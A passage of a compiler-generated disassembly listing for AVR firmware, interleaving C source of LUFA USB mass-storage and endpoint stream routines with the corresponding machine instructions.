	MSInterfaceInfo->Config.DataINEndpoint.Type  = EP_TYPE_BULK;
    6470:	82 e0       	ldi	r24, 0x02	; 2
    6472:	8c 83       	std	Y+4, r24	; 0x04
	MSInterfaceInfo->Config.DataOUTEndpoint.Type = EP_TYPE_BULK;
    6474:	89 87       	std	Y+9, r24	; 0x09

	if (!(Endpoint_ConfigureEndpointTable(&MSInterfaceInfo->Config.DataINEndpoint, 1)))
    6476:	61 e0       	ldi	r22, 0x01	; 1
    6478:	ce 01       	movw	r24, r28
    647a:	01 96       	adiw	r24, 0x01	; 1
    647c:	88 d2       	rcall	.+1296   	; 0x698e <Endpoint_ConfigureEndpointTable>
    647e:	88 23       	and	r24, r24
    6480:	21 f0       	breq	.+8      	; 0x648a <MS_Device_ConfigureEndpoints+0x2e>
	  return false;

	if (!(Endpoint_ConfigureEndpointTable(&MSInterfaceInfo->Config.DataOUTEndpoint, 1)))
    6482:	61 e0       	ldi	r22, 0x01	; 1
    6484:	ce 01       	movw	r24, r28
    6486:	06 96       	adiw	r24, 0x06	; 6
    6488:	82 d2       	rcall	.+1284   	; 0x698e <Endpoint_ConfigureEndpointTable>
	  return false;

	return true;
}
    648a:	df 91       	pop	r29
    648c:	cf 91       	pop	r28
    648e:	08 95       	ret

00006490 <MS_Device_USBTask>:

void MS_Device_USBTask(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
    6490:	cf 93       	push	r28
    6492:	df 93       	push	r29
    6494:	ec 01       	movw	r28, r24
	if (USB_DeviceState != DEVICE_STATE_Configured)
    6496:	90 91 f3 0d 	lds	r25, 0x0DF3	; 0x800df3 <USB_DeviceState>
    649a:	94 30       	cpi	r25, 0x04	; 4
    649c:	09 f0       	breq	.+2      	; 0x64a0 <MS_Device_USBTask+0x10>
    649e:	72 c0       	rjmp	.+228    	; 0x6584 <MS_Device_USBTask+0xf4>
	  return;

	Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataOUTEndpoint.Address);
    64a0:	8e 81       	ldd	r24, Y+6	; 0x06
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    64a2:	8f 70       	andi	r24, 0x0F	; 15
    64a4:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
			 *  \return Boolean \c true if current endpoint is has received an OUT packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsOUTReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsOUTReceived(void)
			{
				return ((UEINTX & (1 << RXOUTI)) ? true : false);
    64a8:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>

	if (Endpoint_IsOUTReceived())
    64ac:	82 ff       	sbrs	r24, 2
    64ae:	39 c0       	rjmp	.+114    	; 0x6522 <MS_Device_USBTask+0x92>
	{
		if (MS_Device_ReadInCommandBlock(MSInterfaceInfo))
    64b0:	ce 01       	movw	r24, r28
    64b2:	e7 de       	rcall	.-562    	; 0x6282 <MS_Device_ReadInCommandBlock>
    64b4:	88 23       	and	r24, r24
    64b6:	a9 f1       	breq	.+106    	; 0x6522 <MS_Device_USBTask+0x92>
		{
			if (MSInterfaceInfo->State.CommandBlock.Flags & MS_COMMAND_DIR_DATA_IN)
    64b8:	88 8d       	ldd	r24, Y+24	; 0x18
    64ba:	88 23       	and	r24, r24
    64bc:	24 f4       	brge	.+8      	; 0x64c6 <MS_Device_USBTask+0x36>
			  Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataINEndpoint.Address);
    64be:	89 81       	ldd	r24, Y+1	; 0x01
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    64c0:	8f 70       	andi	r24, 0x0F	; 15
    64c2:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>

			bool SCSICommandResult = CALLBACK_MS_Device_SCSICommandReceived(MSInterfaceInfo);
    64c6:	ce 01       	movw	r24, r28
    64c8:	0e 94 2b 1d 	call	0x3a56	; 0x3a56 <CALLBACK_MS_Device_SCSICommandReceived>

			MSInterfaceInfo->State.CommandStatus.Status              = (SCSICommandResult) ? MS_SCSI_COMMAND_Pass : MS_SCSI_COMMAND_Fail;
    64cc:	88 23       	and	r24, r24
    64ce:	11 f0       	breq	.+4      	; 0x64d4 <MS_Device_USBTask+0x44>
    64d0:	90 e0       	ldi	r25, 0x00	; 0
    64d2:	01 c0       	rjmp	.+2      	; 0x64d6 <MS_Device_USBTask+0x46>
    64d4:	91 e0       	ldi	r25, 0x01	; 1
    64d6:	9f ab       	std	Y+55, r25	; 0x37
			MSInterfaceInfo->State.CommandStatus.Signature           = CPU_TO_LE32(MS_CSW_SIGNATURE);
    64d8:	45 e5       	ldi	r20, 0x55	; 85
    64da:	53 e5       	ldi	r21, 0x53	; 83
    64dc:	62 e4       	ldi	r22, 0x42	; 66
    64de:	73 e5       	ldi	r23, 0x53	; 83
    64e0:	4b a7       	std	Y+43, r20	; 0x2b
    64e2:	5c a7       	std	Y+44, r21	; 0x2c
    64e4:	6d a7       	std	Y+45, r22	; 0x2d
    64e6:	7e a7       	std	Y+46, r23	; 0x2e
			MSInterfaceInfo->State.CommandStatus.Tag                 = MSInterfaceInfo->State.CommandBlock.Tag;
    64e8:	48 89       	ldd	r20, Y+16	; 0x10
    64ea:	59 89       	ldd	r21, Y+17	; 0x11
    64ec:	6a 89       	ldd	r22, Y+18	; 0x12
    64ee:	7b 89       	ldd	r23, Y+19	; 0x13
    64f0:	4f a7       	std	Y+47, r20	; 0x2f
    64f2:	58 ab       	std	Y+48, r21	; 0x30
    64f4:	69 ab       	std	Y+49, r22	; 0x31
    64f6:	7a ab       	std	Y+50, r23	; 0x32
			MSInterfaceInfo->State.CommandStatus.DataTransferResidue = MSInterfaceInfo->State.CommandBlock.DataTransferLength;
    64f8:	4c 89       	ldd	r20, Y+20	; 0x14
    64fa:	5d 89       	ldd	r21, Y+21	; 0x15
    64fc:	6e 89       	ldd	r22, Y+22	; 0x16
    64fe:	7f 89       	ldd	r23, Y+23	; 0x17
    6500:	4b ab       	std	Y+51, r20	; 0x33
    6502:	5c ab       	std	Y+52, r21	; 0x34
    6504:	6d ab       	std	Y+53, r22	; 0x35
    6506:	7e ab       	std	Y+54, r23	; 0x36

			if (!(SCSICommandResult) && (le32_to_cpu(MSInterfaceInfo->State.CommandStatus.DataTransferResidue)))
    6508:	81 11       	cpse	r24, r1
    650a:	09 c0       	rjmp	.+18     	; 0x651e <MS_Device_USBTask+0x8e>
    650c:	45 2b       	or	r20, r21
    650e:	46 2b       	or	r20, r22
    6510:	47 2b       	or	r20, r23
    6512:	29 f0       	breq	.+10     	; 0x651e <MS_Device_USBTask+0x8e>
			 *  \ingroup Group_EndpointPacketManagement_AVR8
			 */
			static inline void Endpoint_StallTransaction(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_StallTransaction(void)
			{
				UECONX |= (1 << STALLRQ);
    6514:	eb ee       	ldi	r30, 0xEB	; 235
    6516:	f0 e0       	ldi	r31, 0x00	; 0
    6518:	80 81       	ld	r24, Z
    651a:	80 62       	ori	r24, 0x20	; 32
    651c:	80 83       	st	Z, r24
			  Endpoint_StallTransaction();

			MS_Device_ReturnCommandStatus(MSInterfaceInfo);
    651e:	ce 01       	movw	r24, r28
    6520:	21 df       	rcall	.-446    	; 0x6364 <MS_Device_ReturnCommandStatus>
		}
	}

	if (MSInterfaceInfo->State.IsMassStoreReset)
    6522:	88 ad       	ldd	r24, Y+56	; 0x38
    6524:	88 23       	and	r24, r24
    6526:	71 f1       	breq	.+92     	; 0x6584 <MS_Device_USBTask+0xf4>
	{
		Endpoint_ResetEndpoint(MSInterfaceInfo->Config.DataOUTEndpoint.Address);
    6528:	2e 81       	ldd	r18, Y+6	; 0x06
			 *  \param[in] Address  Endpoint address whose FIFO buffers are to be reset.
			 */
			static inline void Endpoint_ResetEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ResetEndpoint(const uint8_t Address)
			{
				UERST = (1 << (Address & ENDPOINT_EPNUM_MASK));
    652a:	2f 70       	andi	r18, 0x0F	; 15
    652c:	81 e0       	ldi	r24, 0x01	; 1
    652e:	90 e0       	ldi	r25, 0x00	; 0
    6530:	ac 01       	movw	r20, r24
    6532:	02 c0       	rjmp	.+4      	; 0x6538 <MS_Device_USBTask+0xa8>
    6534:	44 0f       	add	r20, r20
    6536:	55 1f       	adc	r21, r21
    6538:	2a 95       	dec	r18
    653a:	e2 f7       	brpl	.-8      	; 0x6534 <MS_Device_USBTask+0xa4>
    653c:	ea ee       	ldi	r30, 0xEA	; 234
    653e:	f0 e0       	ldi	r31, 0x00	; 0
    6540:	40 83       	st	Z, r20
				UERST = 0;
    6542:	10 82       	st	Z, r1
		Endpoint_ResetEndpoint(MSInterfaceInfo->Config.DataINEndpoint.Address);
    6544:	29 81       	ldd	r18, Y+1	; 0x01
			 *  \param[in] Address  Endpoint address whose FIFO buffers are to be reset.
			 */
			static inline void Endpoint_ResetEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ResetEndpoint(const uint8_t Address)
			{
				UERST = (1 << (Address & ENDPOINT_EPNUM_MASK));
    6546:	2f 70       	andi	r18, 0x0F	; 15
    6548:	02 c0       	rjmp	.+4      	; 0x654e <MS_Device_USBTask+0xbe>
    654a:	88 0f       	add	r24, r24
    654c:	99 1f       	adc	r25, r25
    654e:	2a 95       	dec	r18
    6550:	e2 f7       	brpl	.-8      	; 0x654a <MS_Device_USBTask+0xba>
    6552:	80 83       	st	Z, r24
				UERST = 0;
    6554:	10 82       	st	Z, r1

		Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataOUTEndpoint.Address);
    6556:	8e 81       	ldd	r24, Y+6	; 0x06
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6558:	8f 70       	andi	r24, 0x0F	; 15
    655a:	a9 ee       	ldi	r26, 0xE9	; 233
    655c:	b0 e0       	ldi	r27, 0x00	; 0
    655e:	8c 93       	st	X, r24
			 *  \ingroup Group_EndpointPacketManagement_AVR8
			 */
			static inline void Endpoint_ClearStall(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearStall(void)
			{
				UECONX |= (1 << STALLRQC);
    6560:	eb ee       	ldi	r30, 0xEB	; 235
    6562:	f0 e0       	ldi	r31, 0x00	; 0
    6564:	80 81       	ld	r24, Z
    6566:	80 61       	ori	r24, 0x10	; 16
    6568:	80 83       	st	Z, r24

			/** Resets the data toggle of the currently selected endpoint. */
			static inline void Endpoint_ResetDataToggle(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ResetDataToggle(void)
			{
				UECONX |= (1 << RSTDT);
    656a:	80 81       	ld	r24, Z
    656c:	88 60       	ori	r24, 0x08	; 8
    656e:	80 83       	st	Z, r24
		Endpoint_ClearStall();
		Endpoint_ResetDataToggle();
		Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataINEndpoint.Address);
    6570:	89 81       	ldd	r24, Y+1	; 0x01
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6572:	8f 70       	andi	r24, 0x0F	; 15
    6574:	8c 93       	st	X, r24
			 *  \ingroup Group_EndpointPacketManagement_AVR8
			 */
			static inline void Endpoint_ClearStall(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearStall(void)
			{
				UECONX |= (1 << STALLRQC);
    6576:	80 81       	ld	r24, Z
    6578:	80 61       	ori	r24, 0x10	; 16
    657a:	80 83       	st	Z, r24

			/** Resets the data toggle of the currently selected endpoint. */
			static inline void Endpoint_ResetDataToggle(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ResetDataToggle(void)
			{
				UECONX |= (1 << RSTDT);
    657c:	80 81       	ld	r24, Z
    657e:	88 60       	ori	r24, 0x08	; 8
    6580:	80 83       	st	Z, r24
		Endpoint_ClearStall();
		Endpoint_ResetDataToggle();

		MSInterfaceInfo->State.IsMassStoreReset = false;
    6582:	18 ae       	std	Y+56, r1	; 0x38
	}
}
    6584:	df 91       	pop	r29
    6586:	cf 91       	pop	r28
    6588:	08 95       	ret

0000658a <Endpoint_Null_Stream>:
		else if (Endpoint_IsSETUPReceived())
		  return ENDPOINT_RWCSTREAM_HostAborted;
	}

	return ENDPOINT_RWCSTREAM_NoError;
}
    658a:	ef 92       	push	r14
    658c:	ff 92       	push	r15
    658e:	0f 93       	push	r16
    6590:	1f 93       	push	r17
    6592:	cf 93       	push	r28
    6594:	df 93       	push	r29
    6596:	ec 01       	movw	r28, r24
    6598:	7b 01       	movw	r14, r22
    659a:	60 d2       	rcall	.+1216   	; 0x6a5c <Endpoint_WaitUntilReady>
    659c:	81 11       	cpse	r24, r1
    659e:	2c c0       	rjmp	.+88     	; 0x65f8 <Endpoint_Null_Stream+0x6e>
    65a0:	e1 14       	cp	r14, r1
    65a2:	f1 04       	cpc	r15, r1
    65a4:	29 f0       	breq	.+10     	; 0x65b0 <Endpoint_Null_Stream+0x26>
    65a6:	f7 01       	movw	r30, r14
    65a8:	80 81       	ld	r24, Z
    65aa:	91 81       	ldd	r25, Z+1	; 0x01
    65ac:	c8 1b       	sub	r28, r24
    65ae:	d9 0b       	sbc	r29, r25
    65b0:	00 e0       	ldi	r16, 0x00	; 0
    65b2:	10 e0       	ldi	r17, 0x00	; 0
    65b4:	1e c0       	rjmp	.+60     	; 0x65f2 <Endpoint_Null_Stream+0x68>
    65b6:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    65ba:	85 fd       	sbrc	r24, 5
    65bc:	15 c0       	rjmp	.+42     	; 0x65e8 <Endpoint_Null_Stream+0x5e>
    65be:	e8 ee       	ldi	r30, 0xE8	; 232
    65c0:	f0 e0       	ldi	r31, 0x00	; 0
    65c2:	80 81       	ld	r24, Z
    65c4:	8e 77       	andi	r24, 0x7E	; 126
    65c6:	80 83       	st	Z, r24
    65c8:	e1 14       	cp	r14, r1
    65ca:	f1 04       	cpc	r15, r1
    65cc:	49 f0       	breq	.+18     	; 0x65e0 <Endpoint_Null_Stream+0x56>
    65ce:	f7 01       	movw	r30, r14
    65d0:	80 81       	ld	r24, Z
    65d2:	91 81       	ldd	r25, Z+1	; 0x01
    65d4:	08 0f       	add	r16, r24
    65d6:	19 1f       	adc	r17, r25
    65d8:	11 83       	std	Z+1, r17	; 0x01
    65da:	00 83       	st	Z, r16
    65dc:	85 e0       	ldi	r24, 0x05	; 5
    65de:	0c c0       	rjmp	.+24     	; 0x65f8 <Endpoint_Null_Stream+0x6e>
    65e0:	3d d2       	rcall	.+1146   	; 0x6a5c <Endpoint_WaitUntilReady>
    65e2:	88 23       	and	r24, r24
    65e4:	31 f0       	breq	.+12     	; 0x65f2 <Endpoint_Null_Stream+0x68>
    65e6:	08 c0       	rjmp	.+16     	; 0x65f8 <Endpoint_Null_Stream+0x6e>
    65e8:	10 92 f1 00 	sts	0x00F1, r1	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
    65ec:	21 97       	sbiw	r28, 0x01	; 1
    65ee:	0f 5f       	subi	r16, 0xFF	; 255
    65f0:	1f 4f       	sbci	r17, 0xFF	; 255
    65f2:	20 97       	sbiw	r28, 0x00	; 0
    65f4:	01 f7       	brne	.-64     	; 0x65b6 <Endpoint_Null_Stream+0x2c>
    65f6:	80 e0       	ldi	r24, 0x00	; 0
    65f8:	df 91       	pop	r29
    65fa:	cf 91       	pop	r28
    65fc:	1f 91       	pop	r17
    65fe:	0f 91       	pop	r16
    6600:	ff 90       	pop	r15
    6602:	ef 90       	pop	r14
    6604:	08 95       	ret

00006606 <Endpoint_Write_Stream_LE>:
    6606:	cf 92       	push	r12
    6608:	df 92       	push	r13
    660a:	ef 92       	push	r14
    660c:	ff 92       	push	r15
    660e:	0f 93       	push	r16
    6610:	1f 93       	push	r17
    6612:	cf 93       	push	r28
    6614:	df 93       	push	r29
    6616:	8c 01       	movw	r16, r24
    6618:	eb 01       	movw	r28, r22
    661a:	6a 01       	movw	r12, r20
    661c:	1f d2       	rcall	.+1086   	; 0x6a5c <Endpoint_WaitUntilReady>
    661e:	81 11       	cpse	r24, r1
    6620:	32 c0       	rjmp	.+100    	; 0x6686 <Endpoint_Write_Stream_LE+0x80>
    6622:	c1 14       	cp	r12, r1
    6624:	d1 04       	cpc	r13, r1
    6626:	39 f0       	breq	.+14     	; 0x6636 <Endpoint_Write_Stream_LE+0x30>
    6628:	f6 01       	movw	r30, r12
    662a:	80 81       	ld	r24, Z
    662c:	91 81       	ldd	r25, Z+1	; 0x01
    662e:	c8 1b       	sub	r28, r24
    6630:	d9 0b       	sbc	r29, r25
    6632:	08 0f       	add	r16, r24
    6634:	19 1f       	adc	r17, r25
    6636:	e1 2c       	mov	r14, r1
    6638:	f1 2c       	mov	r15, r1
    663a:	22 c0       	rjmp	.+68     	; 0x6680 <Endpoint_Write_Stream_LE+0x7a>
    663c:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    6640:	85 fd       	sbrc	r24, 5
    6642:	15 c0       	rjmp	.+42     	; 0x666e <Endpoint_Write_Stream_LE+0x68>
    6644:	e8 ee       	ldi	r30, 0xE8	; 232
    6646:	f0 e0       	ldi	r31, 0x00	; 0
    6648:	90 81       	ld	r25, Z
    664a:	9e 77       	andi	r25, 0x7E	; 126
    664c:	90 83       	st	Z, r25
    664e:	c1 14       	cp	r12, r1
    6650:	d1 04       	cpc	r13, r1
    6652:	49 f0       	breq	.+18     	; 0x6666 <Endpoint_Write_Stream_LE+0x60>
    6654:	f6 01       	movw	r30, r12
    6656:	80 81       	ld	r24, Z
    6658:	91 81       	ldd	r25, Z+1	; 0x01
    665a:	e8 0e       	add	r14, r24
    665c:	f9 1e       	adc	r15, r25
    665e:	f1 82       	std	Z+1, r15	; 0x01
    6660:	e0 82       	st	Z, r14
    6662:	85 e0       	ldi	r24, 0x05	; 5
    6664:	10 c0       	rjmp	.+32     	; 0x6686 <Endpoint_Write_Stream_LE+0x80>
    6666:	fa d1       	rcall	.+1012   	; 0x6a5c <Endpoint_WaitUntilReady>
    6668:	88 23       	and	r24, r24
    666a:	51 f0       	breq	.+20     	; 0x6680 <Endpoint_Write_Stream_LE+0x7a>
    666c:	0c c0       	rjmp	.+24     	; 0x6686 <Endpoint_Write_Stream_LE+0x80>
    666e:	f8 01       	movw	r30, r16
    6670:	81 91       	ld	r24, Z+
    6672:	8f 01       	movw	r16, r30
    6674:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
    6678:	21 97       	sbiw	r28, 0x01	; 1
    667a:	ff ef       	ldi	r31, 0xFF	; 255
    667c:	ef 1a       	sub	r14, r31
    667e:	ff 0a       	sbc	r15, r31
    6680:	20 97       	sbiw	r28, 0x00	; 0
    6682:	e1 f6       	brne	.-72     	; 0x663c <Endpoint_Write_Stream_LE+0x36>
    6684:	80 e0       	ldi	r24, 0x00	; 0
    6686:	df 91       	pop	r29
    6688:	cf 91       	pop	r28
    668a:	1f 91       	pop	r17
    668c:	0f 91       	pop	r16
    668e:	ff 90       	pop	r15
    6690:	ef 90       	pop	r14
    6692:	df 90       	pop	r13
    6694:	cf 90       	pop	r12
    6696:	08 95       	ret

00006698 <Endpoint_Write_Stream_BE>:
    6698:	cf 92       	push	r12
    669a:	df 92       	push	r13
    669c:	ef 92       	push	r14
    669e:	ff 92       	push	r15
    66a0:	0f 93       	push	r16
    66a2:	1f 93       	push	r17
    66a4:	cf 93       	push	r28
    66a6:	df 93       	push	r29
    66a8:	eb 01       	movw	r28, r22
    66aa:	7a 01       	movw	r14, r20
    66ac:	6b 01       	movw	r12, r22
    66ae:	21 e0       	ldi	r18, 0x01	; 1
    66b0:	c2 1a       	sub	r12, r18
    66b2:	d1 08       	sbc	r13, r1
    66b4:	c8 0e       	add	r12, r24
    66b6:	d9 1e       	adc	r13, r25
    66b8:	d1 d1       	rcall	.+930    	; 0x6a5c <Endpoint_WaitUntilReady>
    66ba:	81 11       	cpse	r24, r1
    66bc:	33 c0       	rjmp	.+102    	; 0x6724 <Endpoint_Write_Stream_BE+0x8c>
    66be:	e1 14       	cp	r14, r1
    66c0:	f1 04       	cpc	r15, r1
    66c2:	39 f0       	breq	.+14     	; 0x66d2 <Endpoint_Write_Stream_BE+0x3a>
    66c4:	f7 01       	movw	r30, r14
    66c6:	80 81       	ld	r24, Z
    66c8:	91 81       	ldd	r25, Z+1	; 0x01
    66ca:	c8 1b       	sub	r28, r24
    66cc:	d9 0b       	sbc	r29, r25
    66ce:	c8 1a       	sub	r12, r24
    66d0:	d9 0a       	sbc	r13, r25
    66d2:	00 e0       	ldi	r16, 0x00	; 0
    66d4:	10 e0       	ldi	r17, 0x00	; 0
    66d6:	23 c0       	rjmp	.+70     	; 0x671e <Endpoint_Write_Stream_BE+0x86>
    66d8:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    66dc:	85 fd       	sbrc	r24, 5
    66de:	15 c0       	rjmp	.+42     	; 0x670a <Endpoint_Write_Stream_BE+0x72>
    66e0:	e8 ee       	ldi	r30, 0xE8	; 232
    66e2:	f0 e0       	ldi	r31, 0x00	; 0
    66e4:	80 81       	ld	r24, Z
    66e6:	8e 77       	andi	r24, 0x7E	; 126
    66e8:	80 83       	st	Z, r24
    66ea:	e1 14       	cp	r14, r1
    66ec:	f1 04       	cpc	r15, r1
    66ee:	49 f0       	breq	.+18     	; 0x6702 <Endpoint_Write_Stream_BE+0x6a>
    66f0:	f7 01       	movw	r30, r14
    66f2:	80 81       	ld	r24, Z
    66f4:	91 81       	ldd	r25, Z+1	; 0x01
    66f6:	08 0f       	add	r16, r24
    66f8:	19 1f       	adc	r17, r25
    66fa:	11 83       	std	Z+1, r17	; 0x01
    66fc:	00 83       	st	Z, r16
    66fe:	85 e0       	ldi	r24, 0x05	; 5
    6700:	11 c0       	rjmp	.+34     	; 0x6724 <Endpoint_Write_Stream_BE+0x8c>
    6702:	ac d1       	rcall	.+856    	; 0x6a5c <Endpoint_WaitUntilReady>
    6704:	88 23       	and	r24, r24
    6706:	59 f0       	breq	.+22     	; 0x671e <Endpoint_Write_Stream_BE+0x86>
    6708:	0d c0       	rjmp	.+26     	; 0x6724 <Endpoint_Write_Stream_BE+0x8c>
    670a:	f6 01       	movw	r30, r12
    670c:	80 81       	ld	r24, Z
    670e:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
    6712:	f1 e0       	ldi	r31, 0x01	; 1
    6714:	cf 1a       	sub	r12, r31
    6716:	d1 08       	sbc	r13, r1
    6718:	21 97       	sbiw	r28, 0x01	; 1
    671a:	0f 5f       	subi	r16, 0xFF	; 255
    671c:	1f 4f       	sbci	r17, 0xFF	; 255
    671e:	20 97       	sbiw	r28, 0x00	; 0
    6720:	d9 f6       	brne	.-74     	; 0x66d8 <Endpoint_Write_Stream_BE+0x40>
    6722:	80 e0       	ldi	r24, 0x00	; 0
    6724:	df 91       	pop	r29
    6726:	cf 91       	pop	r28
    6728:	1f 91       	pop	r17
    672a:	0f 91       	pop	r16
    672c:	ff 90       	pop	r15
    672e:	ef 90       	pop	r14
    6730:	df 90       	pop	r13
    6732:	cf 90       	pop	r12
    6734:	08 95       	ret

00006736 <Endpoint_Read_Stream_LE>:
    6736:	cf 92       	push	r12
    6738:	df 92       	push	r13
    673a:	ef 92       	push	r14
    673c:	ff 92       	push	r15
    673e:	0f 93       	push	r16
    6740:	1f 93       	push	r17
    6742:	cf 93       	push	r28
    6744:	df 93       	push	r29
    6746:	8c 01       	movw	r16, r24
    6748:	eb 01       	movw	r28, r22
    674a:	6a 01       	movw	r12, r20
    674c:	87 d1       	rcall	.+782    	; 0x6a5c <Endpoint_WaitUntilReady>
    674e:	81 11       	cpse	r24, r1
    6750:	32 c0       	rjmp	.+100    	; 0x67b6 <Endpoint_Read_Stream_LE+0x80>
    6752:	c1 14       	cp	r12, r1
    6754:	d1 04       	cpc	r13, r1
    6756:	39 f0       	breq	.+14     	; 0x6766 <Endpoint_Read_Stream_LE+0x30>
    6758:	f6 01       	movw	r30, r12
    675a:	80 81       	ld	r24, Z
    675c:	91 81       	ldd	r25, Z+1	; 0x01
    675e:	c8 1b       	sub	r28, r24
    6760:	d9 0b       	sbc	r29, r25
    6762:	08 0f       	add	r16, r24
    6764:	19 1f       	adc	r17, r25
    6766:	e1 2c       	mov	r14, r1
    6768:	f1 2c       	mov	r15, r1
    676a:	22 c0       	rjmp	.+68     	; 0x67b0 <Endpoint_Read_Stream_LE+0x7a>
    676c:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    6770:	85 fd       	sbrc	r24, 5
    6772:	15 c0       	rjmp	.+42     	; 0x679e <Endpoint_Read_Stream_LE+0x68>
    6774:	e8 ee       	ldi	r30, 0xE8	; 232
    6776:	f0 e0       	ldi	r31, 0x00	; 0
    6778:	90 81       	ld	r25, Z
    677a:	9b 77       	andi	r25, 0x7B	; 123
    677c:	90 83       	st	Z, r25
    677e:	c1 14       	cp	r12, r1
    6780:	d1 04       	cpc	r13, r1
    6782:	49 f0       	breq	.+18     	; 0x6796 <Endpoint_Read_Stream_LE+0x60>
    6784:	f6 01       	movw	r30, r12
    6786:	80 81       	ld	r24, Z
    6788:	91 81       	ldd	r25, Z+1	; 0x01
    678a:	e8 0e       	add	r14, r24
    678c:	f9 1e       	adc	r15, r25
    678e:	f1 82       	std	Z+1, r15	; 0x01
    6790:	e0 82       	st	Z, r14
    6792:	85 e0       	ldi	r24, 0x05	; 5
    6794:	10 c0       	rjmp	.+32     	; 0x67b6 <Endpoint_Read_Stream_LE+0x80>
    6796:	62 d1       	rcall	.+708    	; 0x6a5c <Endpoint_WaitUntilReady>
    6798:	88 23       	and	r24, r24
    679a:	51 f0       	breq	.+20     	; 0x67b0 <Endpoint_Read_Stream_LE+0x7a>
    679c:	0c c0       	rjmp	.+24     	; 0x67b6 <Endpoint_Read_Stream_LE+0x80>
    679e:	80 91 f1 00 	lds	r24, 0x00F1	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
    67a2:	f8 01       	movw	r30, r16
    67a4:	81 93       	st	Z+, r24
    67a6:	8f 01       	movw	r16, r30
    67a8:	21 97       	sbiw	r28, 0x01	; 1
    67aa:	ff ef       	ldi	r31, 0xFF	; 255
    67ac:	ef 1a       	sub	r14, r31
    67ae:	ff 0a       	sbc	r15, r31
    67b0:	20 97       	sbiw	r28, 0x00	; 0
    67b2:	e1 f6       	brne	.-72     	; 0x676c <Endpoint_Read_Stream_LE+0x36>
    67b4:	80 e0       	ldi	r24, 0x00	; 0
    67b6:	df 91       	pop	r29
    67b8:	cf 91       	pop	r28
    67ba:	1f 91       	pop	r17
    67bc:	0f 91       	pop	r16
    67be:	ff 90       	pop	r15
    67c0:	ef 90       	pop	r14
    67c2:	df 90       	pop	r13
    67c4:	cf 90       	pop	r12
    67c6:	08 95       	ret

000067c8 <Endpoint_Write_Control_Stream_LE>:
    67c8:	20 91 fa 0d 	lds	r18, 0x0DFA	; 0x800dfa <USB_ControlRequest+0x6>
    67cc:	30 91 fb 0d 	lds	r19, 0x0DFB	; 0x800dfb <USB_ControlRequest+0x7>
    67d0:	26 17       	cp	r18, r22
    67d2:	37 07       	cpc	r19, r23
    67d4:	58 f0       	brcs	.+22     	; 0x67ec <Endpoint_Write_Control_Stream_LE+0x24>
    67d6:	61 15       	cp	r22, r1
    67d8:	71 05       	cpc	r23, r1
    67da:	39 f4       	brne	.+14     	; 0x67ea <Endpoint_Write_Control_Stream_LE+0x22>
    67dc:	e8 ee       	ldi	r30, 0xE8	; 232
    67de:	f0 e0       	ldi	r31, 0x00	; 0
    67e0:	20 81       	ld	r18, Z
    67e2:	2e 77       	andi	r18, 0x7E	; 126
    67e4:	20 83       	st	Z, r18
    67e6:	9b 01       	movw	r18, r22
    67e8:	01 c0       	rjmp	.+2      	; 0x67ec <Endpoint_Write_Control_Stream_LE+0x24>
    67ea:	9b 01       	movw	r18, r22
    67ec:	e8 2f       	mov	r30, r24
    67ee:	f9 2f       	mov	r31, r25
    67f0:	90 e0       	ldi	r25, 0x00	; 0
    67f2:	30 c0       	rjmp	.+96     	; 0x6854 <Endpoint_Write_Control_Stream_LE+0x8c>
    67f4:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>
    67f8:	88 23       	and	r24, r24
    67fa:	09 f4       	brne	.+2      	; 0x67fe <Endpoint_Write_Control_Stream_LE+0x36>
